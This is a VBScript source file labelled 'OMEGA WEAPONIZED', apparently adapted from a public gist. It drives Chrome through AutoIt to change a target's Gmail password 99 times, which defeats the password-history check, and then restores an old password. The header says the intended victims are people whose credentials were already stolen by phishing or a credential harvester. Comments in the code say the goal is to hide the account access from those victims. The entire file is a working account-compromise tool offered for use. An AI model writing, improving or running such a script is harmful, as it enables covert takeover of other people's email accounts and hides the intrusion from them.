''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' ☠️ OMEGA WEAPONIZED - GMAIL PASSWORD CYCLER ☠️
' 
' Original: pborreli / bjarki GitHub Gist
' Version:  1.5 (weaponized)
' Purpose:  Cycle Gmail password 100 times to bypass Google's
'           password history restriction, then restore old password
'
' USE CASE: After capturing victim's current password via
'           OAuth Phishing Server or Credential Harvester,
'           run this to reset their password to an old one
'           WITHOUT them knowing.
'
' REQUIREMENTS:
'   - AutoItX3 COM object (install AutoIt or AutoItX)
'   - Chrome browser installed
'   - Victim's current username + password
'
' USAGE:
'   1. Edit sUN, curPW, oldPW below
'   2. Run: cscript gmail_password_cycler.vbs
'
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Declare Variables & Objects
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Dim oShell
Dim oAutoIt

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Initialise Variables & Objects
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Set oShell = WScript.CreateObject("WScript.Shell")
Set oAutoIt = WScript.CreateObject("AutoItX3.Control")

WScript.Echo "☠️ OMEGA GMAIL PASSWORD CYCLER ☠️"
WScript.Echo "This script will reset the target's google password 100 times"
WScript.Echo "to bypass password history, then restore the old password."
WScript.Echo ""


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' ⚠️ EDIT THESE VALUES ⚠️
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

' Target's Google email address
sUN = "username@gmail.com" 

' Target's CURRENT password (obtained from OAuth/cred harvest)
curPW = "????????" 

' The FINAL password to set — ideally an old password they've used before
' that they'll recognize. This hides the fact the account was accessed.
oldPW = "????????" 

' Speed adjustment. Increase if connections are slow (makes it more reliable)
iSlowConnectionFactor = 1

' Chrome executable path
ChromeEXE = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
' ChromeEXE = "C:\Program Files\Google\Chrome\Application\chrome.exe"  ' 32-bit


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Start of Script
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

oShell.Run ChromeEXE, 1, False

' Wait for Chrome window
oAutoIt.WinWaitActive "New Tab - Google Chrome", ""
oAutoIt.Sleep 3000

WScript.Echo "Entering password cycle loop (99 iterations)..."
tCurPw = curPW

For x = 1 To 99
    WScript.Echo "  Step " & x & "/99"
    WScript.Echo "  Current PW: " & tCurPw
    tNewPW = curPW & x
    WScript.Echo "  Setting to: " & tNewPW
    
    GLogin sUN, tCurPw
    GEditPW
    oAutoIt.Send tCurPw & "{TAB}{TAB}"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send tNewPW & "{TAB}"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send tNewPW & "{TAB}"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send "{ENTER}"
    oAutoIt.Sleep 3000 * iSlowConnectionFactor 
    
    tCurPw = tNewPW
    GLogout
Next 

WScript.Echo ""
WScript.Echo "Final change — restoring to original old password..."
GLogin sUN, tCurPw
GEditPW

oAutoIt.Send tCurPw & "{TAB}"
oAutoIt.Sleep 250 * iSlowConnectionFactor 
oAutoIt.Send oldPW & "{TAB}"
oAutoIt.Sleep 250 * iSlowConnectionFactor 
oAutoIt.Send oldPW & "{TAB}"
oAutoIt.Sleep 250 * iSlowConnectionFactor 
oAutoIt.Send "{ENTER}"
oAutoIt.Send "https://www.google.com/accounts/Logout{ENTER}"
oAutoIt.Sleep 2000 * iSlowConnectionFactor 

WScript.Echo ""
WScript.Echo "✅ Password cycle complete!"
WScript.Echo "Target's password has been reset to: " & oldPW
WScript.Echo ""

WScript.Quit

Function GLogin(un, pw)
    WScript.Echo "  Logging in as: " & un
    oAutoIt.Send "!d"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send "https://accounts.google.com/Login{ENTER}"
    oAutoIt.Sleep 2000 * iSlowConnectionFactor 
    oAutoIt.Send un & "{TAB}"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send pw & "{ENTER}"
    oAutoIt.Sleep 3000 * iSlowConnectionFactor 
End Function

Function GEditPW()
    oAutoIt.Send "!d"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send "https://accounts.google.com/b/0/EditPasswd{ENTER}"
    oAutoIt.Sleep 2000 * iSlowConnectionFactor 
End Function

Function GLogout()
    oAutoIt.Send "!d"
    oAutoIt.Sleep 250 * iSlowConnectionFactor 
    oAutoIt.Send "https://www.google.com/accounts/Logout{ENTER}"
    oAutoIt.Sleep 3000 * iSlowConnectionFactor 
End Function
